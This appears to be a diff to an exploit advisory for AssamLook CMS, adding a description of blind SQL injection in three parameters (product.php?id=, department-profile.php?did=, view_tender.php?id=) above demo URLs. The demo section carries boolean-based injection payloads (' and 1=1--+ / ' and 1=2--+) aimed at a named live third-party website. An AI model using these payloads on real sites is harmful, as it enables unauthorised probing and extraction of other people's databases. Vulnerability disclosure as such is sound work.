@@ -18,7 +18,20 @@ Tested On: Windows, Firefox
 
 *********************************************************
 
+### Description
+
+AssamLook CMS has Blind SQL Injection Vulnerabilities in 
+
+- product.php?id=
+
+- department-profile.php?did=
+
+- view_tender.php?id=
+
+
+
 ### Demo 1:
+
 https://rhinoprintopacks.com/product.php?id=53' and 1=1--+  
 https://rhinoprintopacks.com/product.php?id=53' and 1=2--+  
 
